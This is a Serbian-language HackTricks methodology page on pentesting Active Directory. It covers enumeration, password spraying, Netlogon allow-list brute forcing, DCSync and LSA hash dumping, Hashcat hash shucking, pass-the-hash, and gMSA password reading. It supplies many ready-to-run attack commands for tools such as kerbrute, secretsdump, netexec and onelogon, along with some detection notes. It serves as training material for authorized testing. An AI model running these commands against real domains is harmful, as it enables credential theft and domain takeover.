# Metodologija za Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** je osnovna tehnologija koja omogućava **mrežnim administratorima** da efikasno kreiraju i upravljaju **domenima**, **korisnicima** i **objektima** u mreži. Dizajniran je tako da može da se skalira i olakšava organizovanje velikog broja korisnika u **grupe** i **podgrupe** kojima se može upravljati, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura **Active Directory-ja** sastoji se od tri osnovna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata skup objekata, kao što su **korisnici** ili **uređaji**, koji koriste zajedničku bazu podataka. **Stabla** su grupe ovih domena povezane zajedničkom strukturom, a **šuma** predstavlja skup više stabala međusobno povezanih putem **odnosa poverenja** i čini najviši sloj organizacione strukture. Na svakom od ovih nivoa mogu se definisati posebna **prava pristupa** i **komunikacije**.

Ključni pojmovi u okviru **Active Directory-ja** su:

1. **Direktorijum** – Sadrži sve informacije o objektima Active Directory-ja.
2. **Objekat** – Označava entitete u direktorijumu, uključujući **korisnike**, **grupe** ili **deljene fascikle**.
3. **Domen** – Služi kao kontejner za objekte direktorijuma. U okviru jednog **šuma** može postojati više domena, a svaki od njih ima sopstveni skup objekata.
4. **Stablo** – Grupa domena koji imaju zajednički korenski domen.
5. **Šuma** – Najviši nivo organizacione strukture u Active Directory-ju, sastavljen od nekoliko stabala koja su povezana **odnosima poverenja**.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju unutar mreže. Ti servisi obuhvataju:

1. **Domain Services** – Centralizuje čuvanje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući funkcije **autentifikacije** i **pretrage**.
2. **Certificate Services** – Upravlja kreiranjem, distribucijom i upravljanjem bezbednim **digitalnim sertifikatima**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijum putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućava **single sign-on** za autentifikaciju korisnika u više veb-aplikacija tokom jedne sesije.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima tako što reguliše njegovu neovlašćenu distribuciju i upotrebu.
6. **DNS Service** – Ključan je za razrešavanje **imena domena**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Definicija Active Directory-ja**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro **razumete** proces **Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još ne znate kako funkcioniše.**](kerberos-authentication.md)

## Podsetnik

Možete da posetite [https://wadcoms.github.io/](https://wadcoms.github.io) da biste brzo videli koje komande možete da pokrenete za enumeraciju/exploit nad AD-om.

> [!WARNING]
> Kerberos komunikacija obično **zahteva potpuno kvalifikovano ime domena (FQDN)** kako bi klijent mogao da dobije tiket za ispravan SPN. Pristupanje računaru putem IP adrese obično dovodi do prelaska na NTLM umesto na Kerberos.

## Recon Active Directory (bez kredencijala/sesija)

Ako imate pristup AD okruženju, ali nemate kredencijale/sesije, možete:

- **Pentestovati mrežu:**
  - Skenirajte mrežu, pronađite računare i otvorene portove, pa pokušajte da **iskoristite ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md)).
  - Enumeracija DNS-a može da otkrije informacije o ključnim serverima u domenu, kao što su veb-serveri, štampači, deljeni resursi, VPN, mediji itd.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Pogledajte opštu [**Pentesting metodologiju**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako to da uradite.
- **Proverite null i Guest pristup SMB servisima** (ovo neće raditi na modernim verzijama Windows-a):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Detaljniji vodič za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerišite LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Detaljniji vodič za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonimni pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatrovajte mrežu**
  - Prikupite kredencijale [**imitiranjem servisa pomoću Responder-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Pristupite hostu [**zloupotrebom relay attack-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Prikupite kredencijale tako što ćete **izložiti** [**lažne UPnP servise pomoću evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Izvucite korisnička imena/imena iz internih dokumenata, društvenih mreža i servisa (uglavnom veb) u domenskim okruženjima, kao i iz javno dostupnih izvora.
  - Ako pronađete puna imena zaposlenih u kompaniji, možete da isprobate različite AD **konvencije za korisnička imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _ImePrezime_, _Ime.Prezime_, _ImePre_ (po 3 slova od svakog), _Ime.Pre_, _IPrezime_, _I.Prezime_, _PrezimeIme_, _Prezime.Ime_, _PrezimeI_, _Prezime.I_, 3 _nasumična slova i 3 nasumična broja_ (abc123).
  - Alati:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonimna SMB/LDAP enumeracija:** Pogledajte stranice za [**pentesting SMB-a**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP-a**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enumeracija**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti Kerberos kodom **greške** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. Za **važeća korisnička imena** server će vratiti ili **TGT u AS-REP** odgovoru ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, koja ukazuje na to da korisnik mora da obavi preautentifikaciju.
- **Bez autentifikacije preko MS-NRPC**: Korišćenje auth-level = 1 (bez autentifikacije) na interfejsu MS-NRPC (Netlogon) kontrolera domena. Metod poziva funkciju `DsrGetDcNameEx2` nakon povezivanja sa MS-NRPC interfejsom kako bi proverio da li korisnik ili računar postoje, bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje je dostupno [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) server**

Ako ste pronašli neki od ovih servera u mreži, možete izvršiti i **enumeraciju korisnika na njemu**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom GitHub repozitorijumu**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i ovom ([**statistički verovatnim korisničkim imenima**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** iz koraka za izviđanje koji je trebalo da obavite pre ovoga. Pomoću imena i prezimena mogli biste da koristite skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje potencijalno važećih korisničkih imena.

### Zloupotreba allow-list-e ranjivih Netlogon kanala (Onelogon)

Čak i kada je **Zerologon** zakrpljen na DC-u, nalozi eksplicitno dodati na allow-list-u i dalje mogu biti izloženi **nasleđenom/ranjivom ponašanju Netlogon secure-channel-a**. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća vrednost u registru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL bezbednosni deskriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Svaki nalog ili grupa kojima je dodeljen odgovarajući ACE u DACL-u mogu biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno dodaje **Everyone** na allow-list-u.

Praktični postupak za operatera:

1. **Identifikujte principal-e na allow-list-i** proverom **SYSVOL/GPO** i registra aktivnog DC-a.
2. **Razrešite SID-ove** iz SDDL-a u stvarne AD korisnike/računare i dajte prioritet **nalozima računara DC-a**, **nalozima trust-a** i drugim privilegovanim mašinama.
3. Više puta pokušajte **MS-NRPC / Netlogon autentifikaciju** kao nalog sa allow-list-e.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon postavljanje lozinke** da biste resetovali lozinku ciljnog naloga (javni PoC je postavlja na prazan niz).<sup>[[9]](#references)[[10]](#references)</sup>

Primeri za brzu trijažu / laboratoriju iz javnog artefakta:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Beleške:

- **Skener** je koristan jer efektivna allow-lista može da se nalazi u **SYSVOL**, registru ili na oba mesta.
- Sama putanja eksploatacije je važna jer, kada se identifikuje ranjiv nalog, **ne zahteva privilegije Domain Admin**.
- Kompromitovanje **mašinskog naloga Domain Controller-a**, kao što je `DC$`, posebno je opasno jer resetovanje te lozinke može direktno da omogući šire putanje za **preuzimanje AD-a**.
- Izvodljivost **brute-force** napada zavisi od režima: javno dostupan artefakt opisuje meet-in-the-middle pristup, **24-bitni** brute force kada je dostupan još jedan računarski nalog i sporije **32-bitne** varijante.

Beleške za detekciju i ojačavanje:

- Revidirajte politiku allow-liste i uklonite sve osim privremenih izuzetaka za kompatibilnost koji su izričito neophodni.
- Pratite DC događaje **5827/5828/5829/5830/5831** u evidenciji **System** da biste otkrili ranjive Netlogon veze koje su odbijene, otkrivene ili izričito dozvoljene politikom.
- Nalozi na listi `VulnerableChannelAllowList` smatraju se **visokorizičnim** dok se ne ukloni zavisnost od zastarelog sistema.

### Poznavanje jednog ili više korisničkih imena

Dobro, dakle znate da već imate važeće korisničko ime, ali nemate lozinke... Onda probajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_, možete **zatražiti AS_REP poruku** za tog korisnika, koja će sadržati podatke šifrovane ključem izvedenim iz korisnikove lozinke.
- [**Password Spraying**](password-spraying.md): Hajde da probamo najčešće **lozinke** sa svakim od otkrivenih korisnika; možda neki korisnik koristi slabu lozinku (imajte na umu politiku lozinki!).
  - Imajte na umu da možete da isprobate i **OWA servere** da biste dobili pristup poštanskim serverima korisnika.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **pribavite** neke izazovne **hash-eve** tako što ćete izvršiti **poisoning** određenih mrežnih protokola:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracija Active Directory okruženja pruža korisnička imena, identifikatore e-pošte i obrasce imenovanja, potencijalne hostove i servise čijim se autentifikovanjem može manipulisati. Iskoristite taj kontekst da biste identifikovali izvodljive NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) i potencijalne putanje do AD okruženja.

### NetExec izviđanje zasnovano na workspace-u i provere relay stanja

- Koristite **`nxcdb` workspaces** da biste sačuvali stanje AD izviđanja za svako angažovanje: `workspace create <name>` kreira SQLite baze podataka za svaki protokol u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Promenite prikaz pomoću `proto smb|mssql|winrm` i izlistajte prikupljene tajne pomoću `creds`. Po završetku ručno uklonite osetljive podatke: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Brzo otkrivanje podmreže pomoću **`netexec smb <cidr>`** prikazuje **domen**, **verziju OS-a**, **zahteve za SMB potpisivanje** i **Null Auth**. Članovi domena prikazani kao `(signing:False)` podložni su **relay** napadima, dok DC-ovi često zahtevaju potpisivanje.
- Generišite **imena hostova u /etc/hosts** direktno iz NetExec izlaza da biste olakšali ciljanje:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Kada je **SMB relay ka DC-u blokiran** zbog potpisivanja, ipak proverite stanje **LDAP-a**: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding podešavanje. DC za koji je SMB signing obavezan, ali je LDAP signing onemogućen, i dalje je održiva meta za **relay-to-LDAP** napade kao što je **SPN-less RBCD**.

### Curenje kredencijala sa klijentskih štampača → masovna validacija domenskih kredencijala

- Web UI-ji štampača ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled izvornog koda/devtools alata može otkriti cleartext (npr. `<input value="<password>">`), što omogućava Basic-auth pristup repozitorijumima za skeniranje/štampu.
- Preuzeti poslovi štampe mogu da sadrže **dokumentaciju za uvođenje korisnika u plain text formatu**, sa lozinkama pojedinačnih korisnika. Očuvajte uparivanja tokom testiranja:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Krađa NTLM kredencijala

Ako možete **da pristupite drugim računarima ili deljenim resursima** koristeći **null ili guest korisnika**, možete **postaviti datoteke** (kao što je SCF datoteka) koje će, ako im se nekako pristupi, **pokrenuti NTLM autentifikaciju prema vama**, pa možete **ukrasti** **NTLM challenge** da biste ga razbili:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao moguću lozinku za druge, sporije formate čiji se ključni materijal direktno izvodi iz NT hasha. Umesto da metodom brute-force pogađate duge lozinke u Kerberos RC4 tiketima, NetNTLM izazovima ili keširanim kredencijalima, prosleđujete NT hash-eve Hashcat NT-candidate režimima i dopuštate im da provere ponovnu upotrebu lozinke, a da pritom nikada ne saznate njen tekstualni oblik. Ovo je naročito efikasno nakon kompromitovanja domena, kada možete prikupiti hiljade aktuelnih i prethodnih NT hash-eva.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate NT korpus iz DCSync, SAM/SECURITY dumpova ili trezora kredencijala i želite da proverite ponovnu upotrebu u drugim domenima/šumama.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore ili DCC/DCC2 blobove.
- Želite brzo da dokažete ponovnu upotrebu dugih lozinki koje je nemoguće razbiti i odmah pređete na sledeći korak pomoću Pass-the-Hash.

Ova tehnika **ne funkcioniše** protiv tipova šifrovanja čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen nameće upotrebu samo AES-a, morate se vratiti na standardne režime za lozinke.

#### Formiranje NT hash korpusa

- **DCSync/NTDS** – Koristite `secretsdump.py` sa istorijom da biste prikupili najveći mogući skup NT hash-eva (i njihove prethodne vrednosti):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Istorijski unosi dramatično proširuju skup kandidata jer Microsoft može da čuva do 24 prethodna hash-a po nalogu. Za više načina prikupljanja NTDS tajni pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Dump-ovi keša endpointa** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izdvaja lokalne SAM/SECURITY podatke i keširane prijave na domen (DCC/DCC2). Uklonite duplikate i dodajte te hash-eve na istu listu `nt_candidates.txt`.
- **Pratite metapodatke** – Beležite korisničko ime/domen iz kog potiče svaki hash (čak i ako wordlist sadrži samo heksadecimalne vrednosti). Poklapanje hash-eva odmah otkriva koji principal ponovo koristi lozinku kada Hashcat prikaže uspešnog kandidata.
- Dajte prednost kandidatima iz iste šume ili pouzdane šume; tako se povećava verovatnoća poklapanja pri shucking-u.

#### Hashcat NT-candidate režimi

| Tip hash-a                              | Režim lozinke | NT-candidate režim |
| ---------------------------------------- | ------------- | ----------------- |
| Keširani akreditivi domena (DCC)         | 1100          | 31500             |
| Keširani akreditivi domena 2 (DCC2)      | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- Ulazi NT-candidate **moraju ostati sirovi NT hash-evi od 32 heksadecimalna znaka**. Isključite rule engine-e (bez `-r` i hibridnih režima), jer izmena kvari materijal ključa kandidata.
- Ovi režimi nisu sami po sebi brži, ali je prostor ključeva NTLM-a (~30.000 MH/s na M3 Max) oko 100 puta brži od Kerberos RC4 (~300 MH/s). Provera pažljivo odabrane NT liste mnogo je jeftinija od pretraživanja celog prostora lozinki u sporom formatu.
- Uvek koristite **najnoviju verziju Hashcat-a** (`git clone https://github.com/hashcat/hashcat && make install`), jer su režimi 31500/31600/35300/35400 nedavno objavljeni.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT režim za AS-REQ Pre-Auth, a AES etype-ovi (19600/19700) zahtevaju lozinku u čistom tekstu jer se njihovi ključevi izvode pomoću PBKDF2 iz lozinki kodiranih u UTF-16LE, a ne iz sirovih NT hash-eva.

#### Primer – Kerberoast RC4 (režim 35300)

1. Uhvatite RC4 TGS za ciljni SPN koristeći nalog sa niskim privilegijama (detalje potražite na stranici Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Razbij ticket pomoću svoje NT liste:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Poklapanje potvrđuje da servisni nalog koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pređite na PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Po potrebi kasnije možete oporaviti tekst u otvorenom obliku pomoću `hashcat -m 1000 <matched_hash> wordlists/`.

#### Primer – Keširani akreditivi (mode 31600)

1. Izvucite keširane prijave sa kompromitovane radne stanice:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopirajte DCC2 liniju za zanimljivog korisnika domena u `dcc2_highpriv.txt` i shuck-ujte je:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Uspešno poklapanje daje NT hash koji već postoji na vašoj listi, što dokazuje da keširani korisnik ponovo koristi istu lozinku. Iskoristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili je brute-force metodom u brzom NTLM režimu da biste otkrili lozinku.

Isti postupak važi za NetNTLM challenge-response vrednosti (`-m 27000/27100`) i DCC (`-m 31500`). Kada pronađete poklapanje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo probati da otkrijete NT hash pomoću maski/pravila, offline.



## Enumerisanje Active Directory-ja SA credentials/session

Za ovu fazu morate **kompromitovati credentials ili sesiju validnog domenskog naloga.** Ako imate neke validne credentials ili shell kao domenski korisnik, **imajte na umu da opcije navedene ranije i dalje možete koristiti za kompromitovanje drugih korisnika**.

Pre nego što započnete autentifikovano enumerisanje, upoznajte se sa **Kerberos double-hop problemom**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerisanje

Kompromitovanje naloga je **veliki korak ka proceni domena**, jer omogućava autentifikovano **Active Directory enumerisanje**:

U vezi sa [**ASREPRoast**](asreproast.md), sada možete pronaći sve potencijalno ranjive korisnike, a u vezi sa [**Password Spraying**](password-spraying.md) možete dobiti **listu svih korisničkih imena** i isprobati lozinku kompromitovanog naloga, prazne lozinke i nove obećavajuće lozinke.

- Možete koristiti [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možete koristiti i [**powershell for recon**](../basic-powershell-for-pentesters/index.html), koji će biti manje upadljiv
- Možete i [**use powerview**](../basic-powershell-for-pentesters/powerview.md) da biste izvukli detaljnije informacije
- Još jedan izvanredan alat za recon u Active Directory-ju je [**BloodHound**](bloodhound.md). **Nije naročito neupadljiv** (u zavisnosti od metoda prikupljanja koje koristite), ali **ako vam to nije važno**, svakako ga isprobajte. Pronađite gde korisnici mogu da koriste RDP, putanju do drugih grupa itd.
  - **Ostali automatizovani alati za AD enumerisanje su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Proverite [**DNS zapise AD-ja**](ad-dns-records.md), jer mogu sadržati zanimljive informacije.
- **Alat sa GUI-jem** koji možete koristiti za enumerisanje direktorijuma je **AdExplorer.exe** iz paketa **SysInternal** Suite.
- Možete pretraživati i LDAP bazu podataka pomoću **ldapsearch** da biste pronašli credentials u poljima _userPassword_ i _unixUserPassword_, pa čak i u beleškama _description_ i _info_ korisnika. Token u polju _info_ koji nije označen, a liči na lozinku, samo je kandidat: zasebno potvrdite njegovu namenu i validnost, a sadržaj beleški nemojte uključivati u rutinski izlaz enumerisanja. Pogledajte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Kada to dozvoljavaju ovlašćenja, pregledajte **dostupne** skripte za prijavljivanje na domen i mapiranje diskova u `\\<dc>\NETLOGON` ili `\\<dc>\SYSVOL\<domain>\scripts`. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) ulogu NETLOGON deljenog resursa za direktorijum sa skriptama. Najpre izlistajte nazive, a zatim pregledajte samo relevantne, čitljive skripte koje ne prelaze ograničenje veličine; nemojte izlistavati ceo deljeni resurs niti ispisivati vrednosti credentials tokom rutinskog enumerisanja. PowerShell poziv [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **ne štiti** doslovnu lozinku sačuvanu u skripti. Sam poziv ne dokazuje da je tajna upisana u skriptu: utvrdite šta mu se prosleđuje, a zatim zasebno proverite nalog, validnost credentials i privilegije. Pregled domenske skripte na udaljenom deljenom resursu zaseban je od enumerisanja lokalnog hosta.
- Ako koristite **Linux**, domen možete enumerisati i pomoću alata [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete isprobati i automatizovane alate kao što su:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Izdvajanje svih domenskih korisnika**

  Veoma je lako dobiti sva domenska korisnička imena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Iako ovaj odeljak o enumerisanju deluje kratko, on je najvažniji od svih. Otvorite linkove (prvenstveno one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne budete osećali sigurno. Tokom procene, ovo je ključni trenutak za pronalaženje puta do DA ili za odluku da se ništa ne može učiniti.

### Predvidljivi unapred kreirani računari nalozi -> pristup gMSA lozinkama

Računi računara pripremljeni za nasleđene join operacije mogu zadržati predvidljivu početnu lozinku. NetExec-ov modul `pre2k` identifikuje karakterističnu vrednost `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i pokušava da dobije Kerberos TGT koristeći prvih 14 znakova malim slovima zapisanog imena računara, bez završnog `$`. Tretirajte ovu UAC vrednost kao kriterijum za izbor kandidata, umesto da pretpostavite da samo članstvo u grupi **Pre-Windows 2000 Compatible Access** dokazuje da je lozinka slaba.<sup>[[18]](#references)[[20]](#references)</sup>

Koristite autentifikovano LDAP enumerisanje da biste proverili kandidate i sačuvali uspešno dobijene TGT-ove. `ALL=True` proširuje proveru i na objekte koji ne odgovaraju podrazumevanom filteru `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Neuspešan podrazumevani/NTLM bind **ne** poništava ovaj nalaz: testirajte pomoću `-k`, FQDN-a koji se razrešava na DC i sata sinhronizovanog sa KDC-om. Uspešna pokretanja modula upisuju liste kandidata i pribavljene ccache datoteke u `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nakon kompromitovanja računarskog principal-a, mapirajte njegova ugnježdena članstva u grupama i izlazna prava. Konkretno, principali navedeni u bezbednosnom deskriptoru `msDS-GroupMSAMembership` za gMSA mogu da čitaju `msDS-ManagedPassword`; NetExec-ov izlaz za `--gmsa` prikazuje dozvoljene principale i vraća trenutni NT hash kada je autentifikacioni računar ovlašćen.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Zatim procenite oporavljeni gMSA kao bilo koji drugi skup akreditiva: proverite članstvo u lokalnim/grupama domena, prava prijavljivanja, SPN-ove, delegiranje i dostupne servise pre nego što pokušate pass-the-hash. Ovaj put preuzimanja zasnovan na ACL-u razlikuje se od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), koji izvodi upravljane lozinke nakon kompromitovanja KDS root key-a.<sup>[[20]](#references)</sup>

Računarski principal može imati i izlaznu kontrolu nad drugim računarskim objektima ili grupama. Nakon preuzimanja takvog principala, zasebno proverite njegova ugnježdena članstva i efektivne ACL-ove: pravo upisa na drugi računarski objekat može omogućiti promenu naloga, a prava za članstvo u grupi mogu dovesti do uloge koja dozvoljava prijavljivanje. Oznaka za pripremljeni nalog, predvidiva konvencija imenovanja ili `GenericWrite` veza sami po sebi ne dokazuju ceo put.

Čitljiva kopija blob-a `msDS-ManagedPassword` u datoteci, deljenom resursu ili rezervnoj kopiji predstavlja zaseban put izlaganja: LDAP read ACL ne može da zaštiti kopiju sačuvanu negde drugde. Pre nego što je protumačite, proverite da li su podaci blob upravljane lozinke i razlikujte to od ovlašćenog LDAP čitanja i izvođenja pomoću KDS root key-a.

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS tiketa** koje koriste servisi povezani sa korisničkim nalozima i razbijanje njihovog šifrovanja — koje se zasniva na korisničkim lozinkama — **van mreže**.

Više o ovome:

{{#ref}}
kerberoast.md
{{#endref}}

### Daljinsko povezivanje (RDP, SSH, FTP, Win-RM itd.)

